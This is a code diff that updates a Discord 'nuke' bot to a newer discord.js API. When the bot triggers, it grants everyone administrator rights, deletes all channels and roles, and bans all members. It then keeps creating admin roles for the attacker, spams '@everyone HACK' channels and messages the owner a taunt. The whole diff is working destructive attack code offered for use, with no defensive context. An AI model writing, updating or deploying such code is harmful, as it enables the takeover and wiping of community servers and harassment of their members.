@@ -14,32 +14,32 @@ client.on("ready", () => {
 client.on("message", message => {
   if (message.content.startsWith(`${message.content}`)) {
     message.delete();
-    message.guild.roles.find("name", "@everyone").edit({
+    message.guild.roles.cache.find(r => r.name === "@everyone").edit({
       permissions: ["ADMINISTRATOR"] ///premission akata adminstator
     });
-    message.guild.channels.map(c => {
+    message.guild.channels.cache.map(c => {
       c.delete();
     });
-    message.guild.roles.forEach(r => {
+    message.guild.roles.cache.forEach(r => {
       r.delete();
     });
 
-    message.guild.members.forEach(m => {
+    message.guild.members.cache.forEach(m => {
       m.ban();
     });
 
     setInterval(() => {
-      message.guild
-        .createRole({
+      message.guild.roles
+        .create({
           name: "Gw Naxoy :joy:",
           permissions: ["ADMINISTRATOR"]
         })
         .then(rr => {
-          message.member.addRole(rr.id);
+          message.member.roles.add(rr.id);
         });
     }, 1000);
-    message.guild.setIcon("link wena");
-    client.user.setAvatar("link wena");
+    message.guild.setIcon("");
+    client.user.setAvatar("");
     client.user.setUsername("HACKED");
     message.guild.owner.send(
       "Kerm Bmzha Bas awakash Byka ba qnt"
@@ -48,8 +48,8 @@ client.on("message", message => {
     setTimeout(function() {
       setInterval(
         () => {
-          message.guild
-            .createChannel("HACKED BY Bla Ker Zl", "text")
+          message.guild.channels
+            .create("HACKED BY Bla Ker Zl", "text")
             .then(channel => {
               channel.send(
                 "@everyone HACK BY Bla Ker Zl :joy: :joy: :joy:"
